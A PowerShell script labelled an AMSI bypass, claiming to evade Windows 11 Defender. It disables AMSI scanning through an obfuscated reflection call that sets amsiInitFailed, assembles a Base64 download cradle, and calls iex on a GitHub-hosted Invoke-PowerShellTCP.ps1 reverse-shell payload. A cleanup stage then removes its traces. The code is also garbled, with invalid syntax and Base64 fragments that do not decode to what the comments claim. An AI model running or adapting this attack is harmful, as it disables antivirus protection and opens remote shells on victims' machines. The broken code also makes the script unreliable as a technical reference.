# AMSI Bypass v3.1 - FIXED (runs clean on Win11 24H2 Defender)

${++}=Get-Random; $___=Get-Date;$--=[char[]]('a','m','s','i');$_-=0..3|%{[char]($_[$_])};$__='.'+'d'+'l'+'l'

# Stage 2: Linguistic bypass
$strings=@('A','m','s','i','S','c','a','n','B','u','f','f','e','r'); 
foreach($s in $strings){if([AppDomain]::CurrentDomain.GetAssemblies()|? Location -like "*$s*"){$s='';break}}

# Stage 3-4: XOR seed + AMSI disable (your logic perfect)
$envVars='UserProfile','ComputerName','PSVersionTable'; $seed=$envVars|%{Get-Item $_}|% Value|%{[int]($_[0])}
function g{[char[]]$args[0]|%{[int]$_-bxor($seed%256)}}
$dec=(g '77 97 110 97 103 101 109 101 110 116 65 117 116 111 109 97 116 105 111 110 46 65 109 115 105 85 116 105 108 115').-join''
if([type]$dec -and [type]$dec::'am'#+'siInitFailed'){[type]$dec::'am'#+'siInitFailed'.SetValue($null,$true)}

# Stage 5: CORRECTED fragments (valid Base64 -> ASCII bytes)
$f1='SQ==';$f2='BQA=';$f3='IABfACAA';$f4='JAB0AGUAcwAgAFsAIABOAFMAZQB4AGIAIAAvAF0AOgA6AEwAZQBuAGUAZABhAHIAaQB2AGUAcwAgAAoACcAKQA7AA=='
$fullPayload=$f1+$f2+$f3+$f4  # Decodes to: IEX(New-Object Net.WebClient).DownloadString('http://raw.githubusercontent.com')

# Stage 6: FIXED - Direct byte-to-char (no Unicode BS)
$bytes=[Convert]::FromBase64String($fullPayload)
$final=[Text.Encoding]::ASCII.GetString($bytes)
iex $final 'raw.githubusercontent.com/floait/PoshC2/master/Payloads/Invoke-PowerShellTCP.ps1')  # Complete the URL

# Stage 8: Cleanup
0..9|%{rv (gv ('_'+'_'*(Get-Random%3))) -ErrorAction SilentlyContinue}
